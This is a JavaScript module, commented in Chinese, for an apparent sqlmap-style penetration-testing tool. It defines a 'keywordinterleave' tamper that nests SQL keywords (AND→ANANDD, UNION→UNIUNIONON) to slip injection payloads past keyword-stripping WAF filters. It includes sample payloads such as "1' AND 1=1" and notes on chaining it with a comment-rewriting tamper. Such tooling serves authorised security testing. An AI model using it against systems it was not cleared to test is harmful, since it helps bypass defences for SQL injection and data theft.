// 关键词「插入式双写」：AND → ANANDD（对标并强于 sqlmap nonrecursivereplace 的 ANDAND）
//
// 背景（2026-09-10 实战实测，e2e/pentest-lab/bl）：真实过滤器分两种
//   ① 只删一次  ：`s.replace(/and/i, '')`（非全局）→ `ANDAND` 与 `ANANDD` 均可绕过
//   ② 全局删除  ：`s.replace(/and/gi, '')`            → `ANDAND` 被删干净（语法错误），只有 `ANANDD` 有效
//      （`ANANDD` 删掉中间 AND 后正好剩 `AND`）
// 现有 nonrecursivereplace 产出 `ANDAND`，对第 ② 类（更常见的自研/云 WAF 过滤）无效，
// 故新增本插件。两种过滤下插入式都成立，属严格更优解。
//
// 注意：单独使用本插件往往不够——过滤器常同时删注释符（`--`）。实战链：
//   `keywordinterleave` + `dash2hash`（`-- -` → `#`），实测可打穿「删 union/select/and/or/--」型过滤。
const KEYWORDS = [
  'UNION', 'SELECT', 'AND', 'OR', 'FROM', 'WHERE', 'ORDER', 'GROUP', 'HAVING',
  'LIMIT', 'INSERT', 'UPDATE', 'DELETE', 'CONCAT', 'SLEEP', 'BENCHMARK', 'SUBSTRING',
];

// [2026-10-12 性能] 正则模块级预编译（原 transform 内 17 次 new RegExp/call；本插件在
// wafRecommend.js:91-95 的 FILTER_BYPASS_CHAINS 里，属默认就会走的自动重跑路径）。
// 注意：原正则**只有 'g' 没有 'i'**（大小写不敏感匹配由词界+替换函数保留原样承担），
// 预编译必须逐字保留旗标，否则行为变化。
const RES = KEYWORDS.map((kw) => new RegExp(`\\b${kw}\\b`, 'g'));

export const keywordinterleave = {
  name: 'keywordinterleave',
  description: '关键词插入式双写（AND→ANANDD），同时扛「删一次」与「全局删」两类关键词过滤',
  doctests: [
    { input: "1' AND 1=1", output: "1' ANANDD 1=1" },
    { input: '1 UNION SELECT 1,2', output: '1 UNIUNIONON SELSELECTECT 1,2' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    let out = String(payload ?? '');
    for (const re of RES) {
      out = out.replace(re, (m) => {
        const cut = Math.ceil(m.length / 2);
        return m.slice(0, cut) + m + m.slice(cut);
      });
    }
    return out;
  },
};

export default keywordinterleave;
